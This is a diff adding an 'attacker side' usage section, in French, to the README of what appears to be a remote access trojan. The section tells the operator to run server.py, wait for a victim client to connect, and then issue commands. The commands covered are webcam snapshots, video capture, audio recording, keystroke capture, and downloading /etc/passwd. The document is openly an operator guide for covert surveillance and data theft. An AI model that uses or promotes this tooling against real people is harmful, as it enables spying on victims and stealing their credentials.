@@ -34,3 +34,23 @@ Fonction	Commande côté serveur
 * 📂 Télécharger fichier >> 	download /chemin/fichier
 * 📁 Changer de dossier >> 	cd chemin
 * ❌ Fermer la connexion >>	exit
+
+#### 🚀 Utilisation côté attaquant (serveur)
+1. Lance le serveur :
+
+```bash
+python3 server.py
+```
+2. Attends la connexion du client
+
+Une fois connecté, tape des commandes :
+
+```ruby
+>> webcam_snap
+>> video_capture
+>> record_audio
+>> get_keys
+>> download /etc/passwd
+>> cd /home/user
+>> exit
+```
